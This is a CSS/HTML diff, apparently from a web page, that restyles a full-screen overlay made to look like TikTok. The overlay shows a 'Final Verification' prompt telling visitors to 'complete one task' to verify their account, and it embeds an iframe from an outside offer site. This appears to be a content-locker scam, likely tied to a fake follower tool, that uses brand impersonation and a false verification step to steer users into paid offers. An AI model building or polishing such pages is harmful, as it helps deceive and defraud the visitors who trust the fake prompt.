@@ -139,65 +139,72 @@ body::before{
   transform: scale(0.98);
 }
 
-/* Updated TikTok Themed Locker */
+/* --- TIKTOK REDESIGNED LOCKER --- */
 .locker-overlay {
   display: none;
   position: fixed;
   inset: 0;
-  background: rgba(0, 0, 0, 0.9);
+  background: rgba(0, 0, 0, 0.85);
+  backdrop-filter: blur(5px);
   z-index: 9999;
   justify-content: center;
   align-items: center;
 }
 
 .locker-content {
-  width: 90%;
-  max-width: 450px;
-  background: #010101; /* Deep black like TikTok */
-  border-radius: 24px;
-  border: 1px solid rgba(255, 255, 255, 0.15);
+  width: 95%;
+  max-width: 480px;
+  background: #010101;
+  border-radius: 30px;
+  /* TikTok Border Effect */
+  border: 2px solid transparent;
+  background-image: linear-gradient(#010101, #010101), linear-gradient(90deg, #FE2C55, #25F4EE);
+  background-origin: border-box;
+  background-clip: content-box, border-box;
+  
   overflow: hidden;
   position: relative;
-  animation: modalFadeIn 0.3s ease-out;
-  box-shadow: 0 0 40px rgba(254, 44, 85, 0.2);
+  animation: modalScaleUp 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+  box-shadow: 0 0 30px rgba(37, 244, 238, 0.15);
 }
 
-@keyframes modalFadeIn {
-  from { opacity: 0; transform: translateY(20px); }
-  to { opacity: 1; transform: translateY(0); }
+@keyframes modalScaleUp {
+  from { opacity: 0; transform: scale(0.85); }
+  to { opacity: 1; transform: scale(1); }
 }
 
 .locker-header {
-  padding: 25px 20px;
+  padding: 30px 20px 20px;
   text-align: center;
-  background: rgba(255,255,255,0.02);
+  background: linear-gradient(to bottom, rgba(254,44,85,0.05), transparent);
 }
 
-.locker-header .tk-logo {
-  font-size: 35px;
-  color: #25F4EE;
-  text-shadow: 2px 0 #FE2C55;
+.locker-header .tk-ico {
+  font-size: 45px;
+  color: #fff;
   margin-bottom: 15px;
+  filter: drop-shadow(2px 0px #FE2C55) drop-shadow(-2px 0px #25F4EE);
 }
 
 .locker-header h3 {
   color: #fff;
-  font-size: 26px;
-  font-weight: 800;
-  margin-bottom: 8px;
+  font-size: 28px;
+  font-weight: 900;
+  letter-spacing: -0.5px;
 }
 
 .locker-header p {
-  color: #d7d7d7;
+  color: #aaa;
   font-size: 15px;
-  line-height: 1.4;
+  margin-top: 8px;
+  padding: 0 20px;
 }
 
 .iframe-container {
   width: 100%;
-  height: 480px;
-  background: #fff; /* Most lockers expect white bg to look clean */
-  border-top: 1px solid #333;
+  height: 500px;
+  background: #fff;
+  border-radius: 0 0 28px 28px;
 }
 
 iframe {
@@ -205,8 +212,8 @@ iframe {
   height: 100%;
   border: none;
 }
+/* --- END LOCKER DESIGN --- */
 
-/* Stats under card */
 .bottom{
   margin-top:18px;
   display:flex;
@@ -228,7 +235,6 @@ iframe {
   font-size:28px;
 }
 
-/* Followers section */
 .history{
   width:100%;
   max-width:950px;
@@ -349,9 +355,9 @@ iframe {
 <div class="locker-overlay" id="lockerOverlay">
   <div class="locker-content">
     <div class="locker-header">
-      <div class="tk-logo"><i class="fa-brands fa-tiktok"></i></div>
-      <h3>Verification Required</h3>
-      <p>Confirm you are the owner of this account by completing one final step.</p>
+      <div class="tk-ico"><i class="fa-brands fa-tiktok"></i></div>
+      <h3>Final Verification</h3>
+      <p>Complete one task below to verify your account and start the process.</p>
     </div>
     <div class="iframe-container">
       <iframe src="https://ogam.site/cl/i/8229kj"></iframe>
